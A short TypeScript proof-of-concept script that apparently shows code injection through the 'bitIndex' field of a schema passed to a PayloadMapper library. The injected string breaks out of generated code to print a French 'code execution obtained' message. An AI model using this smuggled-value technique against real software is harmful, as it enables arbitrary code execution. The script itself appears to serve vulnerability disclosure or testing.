import { PayloadMapper } from './src/protocol/decorators/PayloadMapper.ts';

class PWNED {}

PayloadMapper.defineSchema(PWNED, [
  {
    propertyName: 'bit',
    type: 'bit',
    offset: 0,
    bitIndex: '1) & 1) === 1; console.log(">>> BINGO! CODE EXECUTION OBTENUE VIA BITINDEX <<<"); //',
  } as any
]);

try {
  PayloadMapper.parse(PWNED, new Uint8Array([1]));
} catch (e) {
  console.error(e);
}
